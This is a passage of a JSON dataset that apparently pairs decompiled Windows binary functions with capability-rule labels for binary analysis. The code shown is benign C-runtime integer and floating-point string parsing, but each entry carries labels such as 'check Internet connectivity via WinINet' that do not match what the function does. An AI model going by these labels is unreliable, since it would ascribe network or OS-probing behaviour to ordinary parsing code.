= sub.msvcrt.dll__errno();\n                        *puVar5 = 0x22;\n                        return 0x7fffffffffffffff;\n                    }\n                    if ((uVar10 < 0x8000000000000001) && (iVar3 == 0)) {\n                        return -uVar10;\n                    }\n                    puVar5 = sub.msvcrt.dll__errno();\n                    *puVar5 = 0x22;\n                    return 0x8000000000000000;\n                }\n                uVar9 = iVar8 - 0x57;\n            }\n        }\n        if (uVar7 <= uVar9) goto code_r0x0001400105e7;\n        if (SUB168((SEXT816(0x7fffffffffffffff) & 0xffffffffffffffff | ZEXT816(0x7fffffffffffffff)) / SEXT816(iVar6), 0)\n            + 2U < uVar10) {\n            iVar3 = 1;\n        }\n        else {\n            uVar10 = uVar10 * iVar6 + uVar9;\n        }\n    } while( true );\n}\n",
        "token_count": 1121
    },
    "14001075": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2bh\n\nuint64_t fcn.140010750(char *arg1, char **arg2, ulong arg3)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    ulong var_2bh;\n    \n    uVar7 = arg3;\n    if (arg2 != NULL) {\n        *arg2 = arg1;\n    }\n    if ((arg3 == 1) || (0x24 < arg3)) {\n        puVar5 = sub.msvcrt.dll__errno();\n        *puVar5 = 0x21;\n        return 0;\n    }\n    while( true ) {\n        cVar1 = *arg1;\n        iVar3 = sub.msvcrt.dll_isspace();\n        if (iVar3 == 0) break;\n        arg1 = arg1 + 1;\n    }\n    cVar2 = cVar1;\n    if ((cVar1 - 0x2bU & 0xfd) == 0) {\n        cVar2 = arg1[1];\n        arg1 = arg1 + 1;\n    }\n    iVar9 = cVar2;\n    if (arg3 == 0) {\n        uVar7 = 10;\n        if (cVar2 == '0') {\n            if ((arg1[1] & 0xdfU) != 0x58) {\n                uVar8 = 8;\n                uVar7 = 8;\n                iVar9 = 0x30;\n                goto code_r0x000140010953;\n            }\ncode_r0x0001400108e7:\n            iVar9 = arg1[2];\n            uVar7 = 0x10;\n            arg1 = arg1 + 2;\n        }\ncode_r0x0001400107c7:\n        uVar8 = uVar7;\n        if (9 < iVar9 - 0x30U) {\n            iVar4 = sub.msvcrt.dll_isupper();\n            if (iVar4 == 0) {\n                iVar4 = sub.msvcrt.dll_islower();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                uVar10 = iVar9 - 0x57;\n            }\n            else {\n                uVar10 = iVar9 - 0x37;\n            }\n            goto code_r0x000140010800;\n        }\n    }\n    else {\n        if ((arg3 != 0x10) || (cVar2 != '0')) goto code_r0x0001400107c7;\n        if ((arg1[1] & 0xdfU) == 0x58) goto code_r0x0001400108e7;\n        uVar8 = 0x10;\n        iVar9 = 0x30;\n    }\ncode_r0x000140010953:\n    uVar10 = iVar9 - 0x30;\ncode_r0x000140010800:\n    if (uVar8 <= uVar10) {\n        return 0;\n    }\n    uVar6 = uVar10;\n    do {\n        uVar11 = uVar6;\n        arg1 = arg1 + 1;\n        iVar9 = *arg1;\n        uVar10 = iVar9 - 0x30;\n        if (9 < uVar10) {\n            iVar4 = sub.msvcrt.dll_isupper();\n            uVar10 = iVar9 - 0x37;\n            if (iVar4 == 0) {\n                iVar4 = sub.msvcrt.dll_islower();\n                if (iVar4 == 0) {\ncode_r0x00014001084f:\n                    if (arg2 != NULL) {\n                        *arg2 = arg1;\n                    }\n                    if (iVar3 == 0) {\n                        if (cVar1 != '-') {\n                            return uVar11;\n                        }\n                        return -uVar11;\n                    }\n                    puVar5 = sub.msvcrt.dll__errno();\n                    *puVar5 = 0x22;\n                    return 0xffffffffffffffff;\n                }\n                uVar10 = iVar9 - 0x57;\n            }\n        }\n        if (uVar8 <= uVar10) goto code_r0x00014001084f;\n        if ((SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / ZEXT816(uVar7), 0) + 1U < uVar11) ||\n           (uVar6 = uVar10 + uVar7 * uVar11,  uVar6 < uVar11)) {\n            iVar3 = 1;\n            uVar6 = uVar11;\n        }\n    } while( true );\n}\n",
        "token_count": 1076
    },
    "140010a5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.140010a50(ulong arg1, uint32_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t arg1_00;\n    uint *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t uStack80;\n    uint32_t auStack76 [3];\n    uint64_t arg2_00;\n    \n    arg1_00 = fcn.140014720(arg1, auStack76, &uStack80);\n    uVar3 = *arg2;\n    uVar8 = uStack80 - uVar3;\n    arg2_00 = uVar8;\n    auStack76[0] = auStack76[0] + uVar8;\n    if (uVar8 < 1) {\n        uVar5 = 0;\n        if (in_stack_00000028 == 0) goto code_r0x000140010b58;\n        uVar9 = 0;\n        uVar4 = 0;\n        if (uVar8 != 0) {\n            uVar5 = uVar3 - uStack80;\n            uStack80 = uVar8;\n            arg1_00 = fcn.1400142d0(arg1_00, uVar5);\n            uVar9 = 0;\n            uVar4 = 0;\n            uVar8 = uStack80;\n        }\n    }\n    else if (uVar3 == 0x35) {\n        uVar5 = 0;\n        if ((in_stack_00000028 == 0) || (uVar5 = 0,  arg2[3] != 1)) goto code_r0x000140010b58;\n        uStack80 = uVar8;\n        uVar4 = fcn.140014ab0(arg1_00, arg2_00);\n        if (uVar4 != 0) goto code_r0x000140010d86;\n        fcn.140013570(arg1_00, uStack80);\n        uVar9 = 0;\n        uVar8 = uStack80;\n    }\n    else if (in_stack_00000030 == 1) {\n        uStack80 = uVar8;\n        uVar4 = fcn.140014ab0(arg1_00, arg2_00);\n        if (uVar4 == 0) {\n            fcn.140013570(arg1_00, uStack80);\n            uVar9 = 0;\n            uVar8 = uStack80;\n        }\n        else {\ncode_r0x000140010d86:\n            fcn.140013570(arg1_00, uStack80);\n            uVar9 = 0x10;\n            uVar8 = uStack80;\n        }\n    }\n    else {\n        if (in_stack_00000030 == 2) {\n            uStack80 = uVar8;\n            uVar4 = fcn.140014ab0(arg1_00, arg2_00);\n            fcn.140013570(arg1_00, uStack80);\n        }\n        else {\n            iVar7 = uVar8 - 1;\n            if (iVar7 == 0) {\n                uVar5 = 0;\n                if (in_stack_00000028 == 0) goto code_r0x000140010b58;\n                uVar5 = *(arg1_00 + 0x18) >> 1;\n            }\n            else {\n                uVar5 = *(arg1_00 + 0x18 + (iVar7 >> 5) * 4) >> (iVar7 & 0x1f);\n            }\n            uStack80 = uVar8;\n            uVar4 = fcn.140014ab0(arg1_00, arg2_00);\n            fcn.140013570(arg1_00, uStack80);\n            uVar9 = ~-(uVar4 == 0) & 0x10;\n            uVar8 = uStack80;\n            if ((uVar5 & 1) == 0) goto code_r0x000140010b94;\n        }\n        arg1_00 = fcn.140010990(arg1_00);\n        uVar8 = uVar3 & 0x1f;\n        if (uVar8 != 0) {\n            uVar8 = 0x20 - uVar8;\n        }\n        puVar2 = arg1_00 + 0x18 + (*(arg1_00 + 0x14) + -1) * 4;\n        uVar5 = 0x1f;\n        if (*puVar2 != 0) {\n            for (; *puVar2 >> uVar5 == 0; uVar5 = uVar5 - 1) {\n            }\n        }\n        if ((uVar5 ^ 0x1f) == uVar8) {\n            uVar9 = 0x20;\n            uVar8 = uStack80;\n        }\n        else {\n            if (uVar4 == 0) {\n                uVar4 = *(arg1_00 + 0x18) & 1;\n            }\n            fcn.140013570(arg1_00, 1);\n            auStack76[0] = auStack76[0] + 1;\n            uVar9 = 0x20;\n            uVar8 = uStack80;\n        }\n    }\ncode_r0x000140010b94:\n    uStack80 = uVar8;\n    uVar8 = arg2[1];\n    if (auStack76[0] < uVar8) {\n        uVar10 = uVar8 - auStack76[0];\n        auStack76[0] = uVar8;\n        if ((uVar3 < uVar10) || (uVar5 = arg2[4],  uVar5 != 0)) {\n            uVar9 = 0;\n            *(arg1_00 + 0x14) = 0;\n            *in_stack_00000038 = 0x50;\n        }\n        else {\n            uVar1 = uVar10 - 1;\n            if ((0 < uVar1) && (uVar4 == 0)) {\n                uVar4 = fcn.140014ab0(arg1_00, uVar1);\n            }\n            uVar8 = uStack80;\n            if ((uVar4 | in_stack_00000028) == 0) goto code_r0x000140010b58;\n            uVar8 = *(arg1_00 + 0x18 + (uVar1 >> 5) * 4);\n            fcn.140013570(arg1_00, uVar10);\n            *in_stack_00000038 = 2;\n            if ((uVar8 & 1 << (uVar1 & 0x1f)) == 0) {\n                if (uVar4 != 0) {\n                    uVar9 = 0x50;\n                }\n            }\n            else {\n                uVar9 = 0x60;\n                arg1_00 = fcn.140010990(arg1_00);\n            }\n        }\n    }\n    else if (arg2[2] < auStack76[0]) {\n        auStack76[0] = arg2[2] + 1;\n        uVar9 = 0;\n        *in_stack_00000038 = 0xa3;\n        puVar6 = sub.msvcrt.dll__errno();\n        *puVar6 = 0x22;\n        *(arg1_00 + 0x14) = 0;\n    }\n    *arg3 = auStack76[0];\n    fcn.140014a40(arg4, uVar3, arg1_00);\n    *in_stack_00000038 = *in_stack_00000038 | uVar9;\n    uVar8 = uStack80;\n    uVar5 = 1;\ncode_r0x000140010b58:\n    uStack80 = uVar8;\n    fcn.140013d90(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 1854
    },
    "140010f2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.140010f20(char *arg1, char **arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char **ppcVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    int64_t arg1_00;\n    int64_t iVar13;\n    ulong arg1_01;\n    int64_t arg1_02;\n    uint64_t uVar14;\n    ulong arg1_03;\n    uint64_t uVar15;\n    uint32_t *puVar16;\n    uint64_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    int32_t iVar23;\n    uint32_t uVar24;\n    char cVar25;\n    uint32_t uVar26;\n    char *arg1_04;\n    uint32_t uVar27;\n    double dVar28;\n    double dVar29;\n    double extraout_XMM0_Qa;\n    uint uVar30;\n    uint uVar31;\n    double dVar32;\n    uint uVar33;\n    uint uVar34;\n    uint uVar35;\n    uint uVar36;\n    uchar auVar37 [16];\n    uint64_t in_stack_00000028;\n    uint32_t uStack276;\n    int32_t iStack264;\n    uint32_t uStack248;\n    int32_t iStack244;\n    uint32_t uStack212;\n    uint32_t uStack208;\n    uint32_t uStack204;\n    uint32_t uStack188;\n    uchar auStack184 [4];\n    uint32_t uStack180;\n    uint32_t uStack176;\n    uint32_t uStack172;\n    char *pcStack168;\n    uint64_t auStack160 [12];\n    \n    ppcVar10 = sub.msvcrt.dll_localeconv();\n    pcVar2 = *ppcVar10;\n    sub.msvcrt.dll_strlen();\n    uStack180 = 0;\n    auStack160[0] = 0;\n    uVar1 = *arg3;\n    pcStack168 = arg1;\ncode_r0x000140010fc3:\n    cVar25 = *pcStack168;\n    // switch table (46 cases) at 0x140017fac\n    switch(cVar25) {\n    case '\\0':\ncode_r0x000140011070:\n        if (arg2 == NULL) {\n            return 6;\n        }\n        *arg2 = arg1;\n        return 6;\n    default:\n        iStack244 = 0;\n        goto code_r0x000140010fe8;\n    case '\\t':\n    case '\\n':\n    case '\\v':\n    case '\\f':\n    case '\\r':\n    case ' ':\n        goto code_r0x0001400110e0;\n    case '+':\n        iStack244 = 0;\n        break;\n    case '-':\n        iStack244 = 1;\n    }\n    cVar25 = pcStack168[1];\n    pcStack168 = pcStack168 + 1;\n    if (cVar25 != '\\0') {\ncode_r0x000140010fe8:\n        uVar9 = 0;\n        if (cVar25 != '0') goto code_r0x000140010ff5;\n        if ((pcStack168[1] & 0xdfU) != 0x58) goto code_r0x000140011348;\n        uStack180 = fcn.140012c40(&pcStack168, arg3, arg4, auStack160);\n        uVar14 = auStack160[0];\n        if (uStack180 != 6) goto code_r0x0001400111b0;\n        pcStack168 = arg1;\n        if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        goto code_r0x0001400111de;\n    }\n    goto code_r0x000140011070;\ncode_r0x0001400110e0:\n    pcStack168 = pcStack168 + 1;\n    goto code_r0x000140010fc3;\ncode_r0x000140011348:\n    do {\n        pcStack168 = pcStack168 + 1;\n        cVar25 = *pcStack168;\n    } while (cVar25 == '0');\n    uVar14 = 0;\n    if (cVar25 == '\\0') goto code_r0x0001400111b0;\n    uVar9 = 1;\ncode_r0x000140010ff5:\n    arg1_04 = pcStack168;\n    uStack208 = arg3[4];\n    uVar7 = cVar25;\n    if (uVar7 - 0x30 < 10) {\n        uVar18 = 0;\n        uVar22 = 0;\n        uVar26 = 0;\n        do {\n            pcStack168 = pcStack168 + 1;\n            if (uVar26 < 9) {\n                uVar22 = (uVar7 - 0x30) + uVar22 * 10;\n            }\n            else if (uVar26 < 0x10) {\n                uVar18 = (uVar7 - 0x30) + uVar18 * 10;\n            }\n            cVar25 = *pcStack168;\n            uVar7 = cVar25;\n            uVar26 = uVar26 + 1;\n        } while (uVar7 - 0x30 < 10);\n    }\n    else {\n        uVar18 = 0;\n        uVar22 = 0;\n        uVar26 = 0;\n    }\n    uVar24 = uVar26;\n    if (*pcVar2 == cVar25) {\n        iVar12 = 1;\n        cVar25 = pcVar2[1];\n        while (cVar25 != '\\0') {\n            if (pcStack168[iVar12] != cVar25) goto code_r0x000140011111;\n            iVar12 = iVar12 + 1;\n            cVar25 = pcVar2[iVar12];\n        }\n        pcStack168 = pcStack168 + iVar12;\n        uVar7 = *pcStack168;\n        if (uVar26 == 0) {\n            if (uVar7 == 0x30) {\n                iVar8 = pcStack168;\n                do {\n                    uVar19 = (1 - iVar8) + pcStack168;\n                    pcStack168 = pcStack168 + 1;\n                    uVar7 = *pcStack168;\n                } while (uVar7 == 0x30);\n            }\n            else {\n                uVar19 = 0;\n            }\n            if (uVar7 - 0x31 < 9) {\n                uVar21 = uVar7 - 0x30;\n                iStack264 = uVar19 + 1;\n                uVar20 = 1;\n                arg1_04 = pcStack168;\n                goto code_r0x000140011f90;\n            }\n            iStack264 = 0;\n            uVar24 = 0;\n        }\n        else {\n            iStack264 = 0;\n            uVar19 = 0;\n            while (uVar21 = uVar7 - 0x30,  uVar21 < 10) {\n                uVar19 = uVar19 + 1;\n                uVar20 = uVar24;\n                if (uVar21 != 0) {\n                    iStack264 = iStack264 + uVar19;\n                    uVar7 = uVar24;\n                    uVar20 = uVar24 + 1;\n                    if (uVar19 != 1) {\n                        uVar20 = uVar24 + uVar19;\n                        uVar7 = uVar20 - 1;\n                        uVar19 = uVar24 + 1;\n                        while( true ) {\n                            uVar27 = uVar19;\n                            if (uVar24 < 9) {\n                                uVar22 = uVar22 * 10;\n                            }\n                            else if (uVar27 < 0x11) {\n                                uVar18 = uVar18 * 10;\n                            }\n                            if (uVar27 == uVar7) break;\n                            uVar19 = uVar27 + 1;\n                            uVar24 = uVar27;\n                        }\n                    }\n                    if (uVar7 < 9) {\ncode_r0x000140011f90:\n                        uVar19 = 0;\n                        uVar22 = uVar21 + uVar22 * 10;\n                    }\n                    else {\n                        uVar19 = 0;\n                        if (uVar20 < 0x11) {\n                            uVar18 = uVar21 + uVar18 * 10;\n                        }\n                    }\n                }\n                uVar7 = pcStack168[1];\n                pcStack168 = pcStack168 + 1;\n                uVar24 = uVar20;\n            }\n        }\n        bVar4 = true;\n    }\n    else {\ncode_r0x000140011111:\n        iStack264 = 0;\n        uVar19 = 0;\n        bVar4 = false;\n    }\n    pcVar2 = pcStack168;\n    uVar17 = uVar7 & 0xffffffdf;\n    if ((uVar7 & 0xffffffdf) != 0x45) {\n        uVar21 = 0;\n        pcStack168 = pcVar2;\n        goto code_r0x000140011137;\n    }\n    if ((uVar24 | uVar19 | uVar9) == 0) goto code_r0x000140011190;\n    cVar25 = pcStack168[1];\n    if (cVar25 == '+') {\n        bVar5 = false;\ncode_r0x000140011cf8:\n        cVar25 = pcStack168[2];\n        pcStack168 = pcStack168 + 2;\n    }\n    else {\n        if (cVar25 == '-') {\n            bVar5 = true;\n            goto code_r0x000140011cf8;\n        }\n        bVar5 = false;\n        pcStack168 = pcStack168 + 1;\n    }\n    uVar7 = cVar25;\n    uVar17 = uVar7 - 0x30;\n    pcVar6 = pcStack168;\n    arg1 = pcVar2;\n    if (uVar7 - 0x30 < 10) {\n        while (uVar7 == 0x30) {\n            uVar7 = pcVar6[1];\n            pcVar6 = pcVar6 + 1;\n        }\n        uVar17 = uVar7 - 0x31;\n        uVar21 = 0;\n        pcStack168 = pcVar6;\n        if (uVar7 - 0x31 < 9) {\n            uVar21 = uVar7 - 0x30;\n            pcStack168 = pcVar6 + 1;\n            uVar7 = pcVar6[1];\n            if (uVar7 - 0x30 < 10) {\n                pcVar2 = pcVar6 + 2;\n                do {\n                    pcStack168 = pcVar2;\n                    uVar21 = (uVar7 - 0x30) + uVar21 * 10;\n                    uVar7 = *pcStack168;\n                    pcVar2 = pcStack168 + 1;\n                } while (uVar7 - 0x30 < 10);\n                uVar20 = 19999;\n                if (pcStack168 - pcVar6 < 9) goto code_r0x0001400126cf;\n            }\n            else {\ncode_r0x0001400126cf:\n                uVar20 = 19999;\n                if (uVar21 < 20000) {\n                    uVar20 = uVar21;\n                }\n            }\n            uVar21 = -uVar20;\n            if (!bVar5) {\n                uVar21 = uVar20;\n            }\n            uVar17 = uVar21;\n        }\n    }\n    else {\n        uVar21 = 0;\n        pcStack168 = pcVar2;\n    }\ncode_r0x000140011137:\n    if (uVar24 == 0) {\n        uVar14 = auStack160[0];\n        if ((uVar19 | uVar9) != 0) goto code_r0x0001400111b0;\n        if (bVar4) goto code_r0x000140011190;\n        if (uVar7 == 0x69) {\ncode_r0x000140011ff5:\n            iVar8 = fcn.1400149f0(&pcStack168, 0x140017fa0);\n            if (iVar8 != 0) {\n                pcStack168 = pcStack168 + -1;\n                iVar8 = fcn.1400149f0(&pcStack168, \"inity\");\n                if (iVar8 == 0) {\n                    pcStack168 = pcStack168 + 1;\n                }\n                uStack180 = 3;\ncode_r0x000140012044:\n                *arg4 = arg3[2] + 1;\n                uVar14 = auStack160[0];\n                goto code_r0x0001400111b0;\n            }\n        }\n        else if (uVar7 < 0x6a) {\n            if (uVar7 == 0x49) goto code_r0x000140011ff5;\n            if (uVar7 == 0x4e) goto code_r0x00014001116a;\n        }\n        else if (uVar7 == 0x6e) {\ncode_r0x00014001116a:\n            iVar8 = fcn.1400149f0(&pcStack168, 0x140017fa9);\n            if (iVar8 != 0) {\n                uStack180 = 4;\n                *arg4 = arg3[2] + 1;\n                uVar14 = auStack160[0];\n                if (*pcStack168 != '(') goto code_r0x0001400111b0;\n                uStack180 = fcn.140013760(&pcStack168, arg3, in_stack_00000028);\n                goto code_r0x000140012044;\n            }\n        }\ncode_r0x000140011190:\n        uStack180 = 6;\n        uVar14 = auStack160[0];\n        pcStack168 = arg1;\n        goto code_r0x0001400111b0;\n    }\n    uVar9 = uVar21 - iStack264;\n    uStack180 = 1;\n    uVar7 = arg3[3] & 3;\n    uStack248 = uVar7 - iStack244;\n    if ((uVar7 != 2) && (uStack248 = iStack244 + 1,  uVar7 != 3)) {\n        uStack248 = uVar7 == 0;\n    }\n    dVar28 = uVar22;\n    if (uVar26 == 0) {\n        uVar26 = uVar24;\n    }\n    uVar7 = 0x10;\n    if (uVar24 < 0x11) {\n        uVar7 = uVar24;\n    }\n    if (9 < uVar24) {\n        dVar28 = dVar28 * *(*0x1400183b0 + (uVar7 - 9) * 8) + uVar18;\n        uVar17 = *0x1400183b0;\n    }\n    uVar18 = uVar9;\n    if ((uVar1 < 0x36) && (uVar24 < 0x10)) {\n        if (uVar9 == 0) {\n            iVar8 = fcn.140010a50(uVar17, arg3, arg4, in_stack_00000028);\n            uVar14 = auStack160[0];\n            if (iVar8 != 0) goto code_r0x0001400111b0;\n            uVar18 = 0;\n            goto code_r0x00014001176c;\n        }\n        if (uVar9 < 1) {\n            if (-0x17 < uVar9) {\n                dVar28 = dVar28 / *(*0x1400183b0 + (iStack264 - uVar21) * 8);\n                goto code_r0x00014001169b;\n            }\n            goto code_r0x00014001176c;\n        }\n        if (uVar9 < 0x17) {\n            uVar18 = SUB84(dVar28, 0);\n            if (uVar18 == 0) {\n                iVar8 = 0;\n                for (uVar18 = dVar28 >> 0x20 | 0x100000; (uVar18 & 1) == 0; uVar18 = uVar18 >> 1 | 0x80000000) {\n                    iVar8 = iVar8 + 1;\n                }\n                iVar8 = 0x15 - iVar8;\n            }\n            else {\n                iVar8 = 0;\n                for (; (uVar18 & 1) == 0; uVar18 = uVar18 >> 1 | 0x80000000) {\n                    iVar8 = iVar8 + 1;\n                }\n                iVar8 = 0x35 - iVar8;\n            }\n            uVar17 = iVar8 + *(uVar9 * 4 + 0x140018080);\n            dVar28 = dVar28 * *(*0x1400183b0 + uVar9 * 8);\ncode_r0x00014001169b:\n            iVar8 = fcn.140010a50(uVar17, arg3, arg4, in_stack_00000028);\n            uVar14 = auStack160[0];\n            if (iVar8 != 0) goto code_r0x0001400111b0;\n            uVar18 = 0;\n            goto code_r0x00014001176c;\n        }\n        uVar18 = (uVar24 - uVar7) + uVar9;\n        if (uVar9 <= 0x25 - uVar24) {\n            uVar18 = uVar9 - (0xf - uVar24);\n            uVar17 = uVar18;\n            dVar28 = dVar28 * *(*0x1400183b0 + (0xf - uVar24) * 8) * *(*0x1400183b0 + uVar18 * 8);\n            goto code_r0x00014001169b;\n        }\ncode_r0x00014001177b:\n        if ((uVar18 & 0xf) != 0) {\n            dVar28 = dVar28 * *(*0x1400183b0 + (uVar18 & 0xf) * 8);\n        }\n        uVar7 = uVar18 & 0xfffffff0;\n        if (uVar7 != 0) {\n            uVar18 = uVar18 >> 4;\n            if (uVar7 < 0x100) {\n                iVar8 = 0;\n            }\n            else {\n                iVar8 = 0;\n                uVar7 = uVar18;\n                do {\n                    uVar7 = uVar7 - 0x10;\n                    uVar19 = dVar28 >> 0x20;\n                    iVar8 = iVar8 + -0x3ff + (uVar19 >> 0x14 & 0x7ff);\n                    dVar28 = (dVar28 & 0xffffffff | (uVar19 & 0x800fffff | 0x3ff00000) << 0x20) * *(*0x1400182f0 + 0x20)\n                    ;\n                } while (0xf < uVar7);\n                uVar18 = uVar18 & 0xf;\n            }\n            uVar7 = dVar28 >> 0x34 & 0x7ff;\n            uVar17 = uVar7;\n            uVar7 = iVar8 + -0x3ff + uVar7;\n            if (uVar18 != 0) {\n                uVar17 = 0;\n                do {\n                    if ((uVar18 & 1) != 0) {\n                        uVar17 = 1;\n                    }\n                    uVar18 = uVar18 >> 1;\n                } while (uVar18 != 0);\n            }\n        }\n    }\n    else {\ncode_r0x00014001176c:\n        uVar18 = (uVar24 - uVar7) + uVar18;\n        if (0 < uVar18) goto code_r0x00014001177b;\n        uVar7 = uVar18;\n        if (uVar18 != 0) {\n            uVar18 = -uVar18;\n            if ((uVar18 & 0xf) != 0) {\n                dVar28 = dVar28 / *(*0x1400183b0 + (uVar18 & 0xf) * 8);\n            }\n            uVar7 = uVar18 & 0xfffffff0;\n            if (uVar7 != 0) {\n                uVar18 = uVar18 >> 4;\n                if (uVar7 < 0x100) {\n                    iVar8 = 0;\n                }\n                else {\n                    iVar8 = 0;\n                    uVar7 = uVar18;\n                    do {\n                        uVar7 = uVar7 - 0x10;\n                        uVar19 = dVar28 >> 0x20;\n                        iVar8 = iVar8 + -0x3ff + (uVar19 >> 0x14 & 0x7ff);\n                        dVar28 = (dVar28 & 0xffffffff | (uVar19 & 0x800fffff | 0x3ff00000) << 0x20) *\n                                 *(*0x1400183c0 + 0x20);\n                    } while (0xf < uVar7);\n                    uVar18 = uVar18 & 0xf;\n                }\n                uVar7 = dVar28 >> 0x34 & 0x7ff;\n                uVar17 = uVar7;\n                uVar7 = iVar8 + -0x3ff + uVar7;\n                if (uVar18 != 0) {\n                    uVar17 = 0;\n                    do {\n                        if ((uVar18 & 1) != 0) {\n                            uVar17 = 1;\n                        }\n                        uVar18 = uVar18 >> 1;\n                    } while (uVar18 != 0);\n                }\n            }\n        }\n    }\n    auStack160[0] = fcn.140014720(uVar17, &uStack172, &uStack176);\n    uStack172 = uVar7 + uStack172;\n    uVar7 = uStack176 - uVar1;\n    if (0 < uVar7) {\n        fcn.140013570(auStack160[0], uVar7);\n        uStack172 = uVar7 + uStack172;\n        uStack176 = uVar1;\n    }\n    uStack204 = (uStack176 + uStack172) - uVar1;\n    if (arg3[2] + 1 < uStack204) {\n        uStack276 = 0;\n        goto code_r0x000140012458;\n    }\n    uVar7 = arg3[1];\n    if (uVar7 <= uStack204) {\n        uStack276 = 0;\n        goto code_r0x0001400118d5;\n    }\n    uVar18 = uStack172 - uVar7;\n    if (0 < uVar18) {\n        auStack160[0] = fcn.1400142d0(auStack160[0], uVar18);\n        uStack176 = uStack176 + uVar18;\ncode_r0x000140011898:\n        if (uStack208 == 0) {\n            uStack276 = 1;\n            uStack204 = uVar7;\n            uStack172 = uVar7;\ncode_r0x0001400118d5:\n            iVar12 = fcn.140014860(arg1_04, uVar26, uVar24, uVar22);\n            uVar33 = SUB84(*0x1400180e0, 0);\n            uVar34 = *0x1400180e0 >> 0x20;\n            uVar35 = *0x1400180e8;\n            uVar36 = *0x1400180e8 >> 0x20;\n            auVar37 = ZEXT816(*0x140018110);\n            uVar18 = 0;\n            uVar22 = iStack264 - uVar21;\n            if (-1 < uVar9) {\n                uVar18 = uVar9;\n                uVar22 = 0;\n            }\n            uVar26 = 0;\n            do {\n                arg1_00 = fcn.140013c90(*(iVar12 + 8));\n                sub.msvcrt.dll_memcpy(arg1_00 + 0x10, iVar12 + 0x10, *(iVar12 + 0x14) * 4 + 8);\n                iVar13 = fcn.140013c90(*(auStack160[0] + 8));\n                sub.msvcrt.dll_memcpy(iVar13 + 0x10);\n                uVar19 = uStack172;\n                uVar24 = uStack176;\n                arg1_01 = fcn.140013eb0(1);\n                iVar8 = uVar19 + uVar26;\n                uVar21 = uVar24 - uVar26;\n                if (iVar8 < 0) {\n                    uVar20 = uVar18 - iVar8;\n                    uVar27 = uVar22;\n                }\n                else {\n                    uVar20 = uVar18;\n                    uVar27 = iVar8 + uVar22;\n                }\n                iVar23 = (uVar24 + uVar19) - uVar1;\n                iVar8 = (uVar1 + 1) - uVar21;\n                if (iVar23 < uVar7) {\n                    iVar8 = (iVar23 - uVar7) + iVar8;\n                }\n                uVar24 = uVar27 + iVar8;\n                uVar20 = uVar20 + iVar8;\n                uVar19 = uVar20;\n                if (uVar24 <= uVar20) {\n                    uVar19 = uVar24;\n                }\n                if (uVar27 <= uVar19) {\n                    uVar19 = uVar27;\n                }\n                if (0 < uVar19) {\n                    uVar24 = uVar24 - uVar19;\n                    uVar20 = uVar20 - uVar19;\n                    uVar27 = uVar27 - uVar19;\n                }\n                arg1_02 = iVar13;\n                if (0 < uVar22) {\n                    arg1_01 = fcn.1400140d0(arg1_01, uVar22);\n                    arg1_02 = fcn.140013f70(arg1_01, iVar13);\n                    fcn.140013d90(iVar13);\n                }\n                uVar19 = uVar24 - uVar26;\n                if (uVar19 < 1) {\n                    if (uVar19 != 0) {\n                        fcn.140013570(arg1_02, uVar26 - uVar24);\n                    }\n                }\n                else {\n                    arg1_02 = fcn.1400142d0(arg1_02, uVar19);\n                }\n                if (0 < uVar9) {\n                    arg1_00 = fcn.1400140d0(arg1_00, uVar18);\n                }\n                if (0 < uVar20) {\n                    arg1_00 = fcn.1400142d0(arg1_00, uVar20);\n                }\n                if (0 < uVar27) {\n                    arg1_01 = fcn.1400142d0(arg1_01, uVar27);\n                }\n                uVar14 = fcn.140014430(arg1_02, arg1_00);\n                uVar24 = uStack208;\n                if ((*(uVar14 + 0x14) < 2) && (*(uVar14 + 0x18) == 0)) goto code_r0x0001400113c0;\n                uVar19 = *(uVar14 + 0x10);\n                *(uVar14 + 0x10) = 0;\n                uVar17 = uVar14;\n                iVar8 = fcn.1400143e0(uVar14, arg1_01);\n                if ((uStack248 == 0) || (0 < iVar8)) {\n                    if (iVar8 < 0) {\n                        if (uVar19 != 0) {\n                            uStack180 = 0x11;\n                            goto code_r0x0001400113c0;\n                        }\n                        uStack180 = 0x21;\n                        if (((1 < uVar21) || (uStack204 == uVar7)) || (uStack276 != 0)) goto code_r0x0001400113c0;\n                        uVar14 = fcn.1400142d0(uVar14, 1);\n                        iVar8 = fcn.1400143e0(uVar14, arg1_01);\n                        uVar9 = uStack176;\n                        if (iVar8 < 1) goto code_r0x000140012546;\n                        uStack180 = 0x11;\n                        uStack276 = 0;\n                    }\n                    else {\n                        if (iVar8 != 0) {\n                            